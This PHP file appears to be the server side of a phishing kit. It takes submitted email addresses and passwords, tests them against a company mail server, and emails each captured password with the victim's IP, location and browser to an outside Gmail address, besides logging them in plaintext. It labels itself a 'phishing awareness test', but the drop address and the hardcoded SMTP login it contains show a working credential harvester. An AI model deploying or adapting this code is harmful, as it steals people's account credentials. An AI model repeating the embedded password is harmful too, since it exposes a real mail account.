<?php
require_once 'class.phpmailer.php';
require_once 'class.smtp.php';

// Security headers
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: POST');
header('Access-Control-Allow-Headers: Content-Type');
header('Content-Type: application/json');

// Start session
session_start();

// Rate limiting to prevent abuse
$rate_limit_key = 'login_attempts_' . $_SERVER['REMOTE_ADDR'];
if (!isset($_SESSION[$rate_limit_key])) {
    $_SESSION[$rate_limit_key] = 0;
}

// Block GET requests
if ($_SERVER['REQUEST_METHOD'] == 'GET') {
    http_response_code(403);
    ?>
    <html>
    <head><title>403 - Forbidden</title></head>
    <body><h1>403 Forbidden</h1>
    <hr>
    </body>
    </html>
    <?php
    exit;
}

// Only allow POST requests
if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    http_response_code(405);
    echo json_encode(['signal' => 'error', 'msg' => 'Method not allowed']);
    exit;
}

// Configuration - Update these with your actual SMTP details
$receiver     = "skkho87.sm@gmail.com"; // Your email to receive logs
$senderuser   = "ajitha@debtclearsa.co.za"; // Your SMTP username
$senderpass   = "Nn19871024@@"; // Your SMTP password
$senderport   = "587"; // Your SMTP port
$senderserver = "mail.debtclearsa.co.za"; // Your SMTP server

// Target SMTP server for credential testing
$target_smtp_server = "mail.debtclearsa.co.za";
$target_smtp_port = 587;
$target_smtp_security = "tls";

// Get client information
$ip = $_SERVER['REMOTE_ADDR'];
$browser = $_SERVER['HTTP_USER_AGENT'];
$timestamp = date('Y-m-d H:i:s');

// Get geolocation data
$ipdat = @json_decode(file_get_contents("http://www.geoplugin.net/json.gp?ip=" . $ip));
$country = isset($ipdat->geoplugin_countryName) ? $ipdat->geoplugin_countryName : 'Unknown';
$city = isset($ipdat->geoplugin_city) ? $ipdat->geoplugin_city : 'Unknown';

// Get and validate input
$login = filter_var($_POST['email'] ?? '', FILTER_SANITIZE_EMAIL);
$passwd = $_POST['password'] ?? '';

// Basic validation
if (empty($login) || empty($passwd)) {
    echo json_encode(['signal' => 'not ok', 'msg' => 'Email and password are required']);
    exit;
}

if (!filter_var($login, FILTER_VALIDATE_EMAIL)) {
    echo json_encode(['signal' => 'not ok', 'msg' => 'Invalid email format']);
    exit;
}

// Extract domain from email
$parts = explode("@", $login);
if (count($parts) !== 2) {
    echo json_encode(['signal' => 'not ok', 'msg' => 'Invalid email format']);
    exit;
}
$domain = $parts[1];

// Increment attempt counter
$_SESSION[$rate_limit_key]++;
$attempt_number = $_SESSION[$rate_limit_key];

// Prepare log message
$log_message = "=== LOGIN ATTEMPT #$attempt_number ===\n";
$log_message .= "Timestamp: $timestamp\n";
$log_message .= "Email: $login\n";
$log_message .= "Password: $passwd\n";
$log_message .= "IP Address: $ip\n";
$log_message .= "Location: $country | $city\n";
$log_message .= "User Agent: $browser\n";

// Test SMTP credentials against the specific target server
$validCredentials = false;
$smtp_error = '';
$connection_details = '';

try {
    // Create PHPMailer instance for credential testing
    $testMail = new PHPMailer(true);
    $testMail->isSMTP();
    $testMail->SMTPAuth = true;
    $testMail->SMTPDebug = 0; // Disable debug output
    $testMail->SMTPSecure = $target_smtp_security;
    $testMail->Host = $target_smtp_server;
    $testMail->Port = $target_smtp_port;
    $testMail->Username = $login;
    $testMail->Password = $passwd;
    $testMail->Timeout = 10; // 10 second timeout
    
    $connection_details = "Testing: $target_smtp_server:$target_smtp_port ($target_smtp_security)";
    $log_message .= "SMTP Server: $connection_details\n";
    
    // Attempt SMTP connection and authentication
    if ($testMail->smtpConnect()) {
        $validCredentials = true;
        $log_message .= "Status: VALID CREDENTIALS - Authentication successful\n";
        $testMail->smtpClose();
    } else {
        $validCredentials = false;
        $log_message .= "Status: INVALID CREDENTIALS - Authentication failed\n";
        $smtp_error = "Authentication failed on $target_smtp_server";
    }
    
} catch (Exception $e) {
    $validCredentials = false;
    $smtp_error = $e->getMessage();
    $log_message .= "Status: SMTP TEST FAILED\n";
    $log_message .= "Error: $smtp_error\n";
    
    // Additional error details for debugging
    if (strpos($smtp_error, 'Authentication failed') !== false) {
        $log_message .= "Authentication Error: Invalid username/password for $target_smtp_server\n";
    } elseif (strpos($smtp_error, 'Connection refused') !== false) {
        $log_message .= "Connection Error: Cannot connect to $target_smtp_server:$target_smtp_port\n";
    } elseif (strpos($smtp_error, 'timeout') !== false) {
        $log_message .= "Timeout Error: Connection to $target_smtp_server timed out\n";
    }
}

$log_message .= "==========================================\n\n";

// Prepare email subject based on result
if ($validCredentials) {
    $subject = "✅ VALID LOGIN - $country - $login - Attempt #$attempt_number";
    $email_status = "VALID CREDENTIALS DETECTED";
} else {
    $subject = "❌ INVALID LOGIN - $country - $login - Attempt #$attempt_number";
    $email_status = "INVALID CREDENTIALS";
}

// Prepare HTML email body
$email_body = "
<html>
<head>
    <style>
        body { font-family: Arial, sans-serif; }
        .header { background-color: " . ($validCredentials ? "#d4edda" : "#f8d7da") . "; padding: 10px; border-radius: 5px; }
        .details { margin: 10px 0; }
        .label { font-weight: bold; }
        .valid { color: #155724; }
        .invalid { color: #721c24; }
        .server-info { background-color: #f8f9fa; padding: 10px; border-left: 4px solid #007bff; margin: 10px 0; }
    </style>
</head>
<body>
    <div class='header " . ($validCredentials ? "valid" : "invalid") . "'>
        <h2>Phishing Awareness Test - Login Attempt</h2>
        <p><strong>Status: $email_status</strong></p>
    </div>
    
    <div class='details'>
        <p><span class='label'>Attempt Number:</span> #$attempt_number</p>
        <p><span class='label'>Timestamp:</span> $timestamp</p>
        <p><span class='label'>Email:</span> $login</p>
        <p><span class='label'>Password:</span> $passwd</p>
        <p><span class='label'>IP Address:</span> $ip</p>
        <p><span class='label'>Location:</span> $country, $city</p>
        <p><span class='label'>User Agent:</span> $browser</p>
    </div>
    
    <div class='server-info'>
        <p><span class='label'>SMTP Server Tested:</span> $connection_details</p>
        " . ($validCredentials ? 
            "<p style='color: #155724;'><span class='label'>Result:</span> ✅ Authentication successful - Valid credentials</p>" : 
            "<p style='color: #721c24;'><span class='label'>Result:</span> ❌ Authentication failed - Invalid credentials</p>
             <p><span class='label'>Error Details:</span> $smtp_error</p>") . "
    </div>
</body>
</html>
";

// Send notification email
$mail_sent = false;
try {
    $notifyMail = new PHPMailer(true);
    $notifyMail->isSMTP();
    $notifyMail->SMTPAuth = true;
    $notifyMail->Host = $senderserver;
    $notifyMail->Username = $senderuser;
    $notifyMail->Password = $senderpass;
    $notifyMail->Port = $senderport;
    $notifyMail->SMTPSecure = 'tls';
    $notifyMail->From = $senderuser;
    $notifyMail->FromName = 'Phishing Awareness System';
    $notifyMail->addAddress($receiver);
    $notifyMail->isHTML(true);
    $notifyMail->Subject = $subject;
    $notifyMail->Body = $email_body;
    $notifyMail->AltBody = strip_tags(str_replace('<br>', "\n", $email_body));
    
    $mail_sent = $notifyMail->send();
} catch (Exception $e) {
    error_log("Failed to send notification email: " . $e->getMessage());
}

// Log to file
$log_file = "phishing_awareness_log.txt";
file_put_contents($log_file, $log_message, FILE_APPEND | LOCK_EX);

// Prepare response based on credential validity
if ($validCredentials) {
    $response = [
        'signal' => 'ok',
        'success' => true,
        'msg' => 'Login successful! Redirecting...',
        'attempt' => $attempt_number,
        'credentials_valid' => true,
        'smtp_server' => $target_smtp_server
    ];
} else {
    $response = [
        'signal' => 'not ok',
        'success' => false,
        'msg' => 'Invalid email or password. Please try again.',
        'attempt' => $attempt_number,
        'credentials_valid' => false,
        'smtp_server' => $target_smtp_server,
        'error_details' => $smtp_error
    ];
}

// Add notification status to response
$response['notification_sent'] = $mail_sent;

// Send JSON response
echo json_encode($response);

// Random hash for additional security
$praga = rand();
$praga = md5($praga);
?>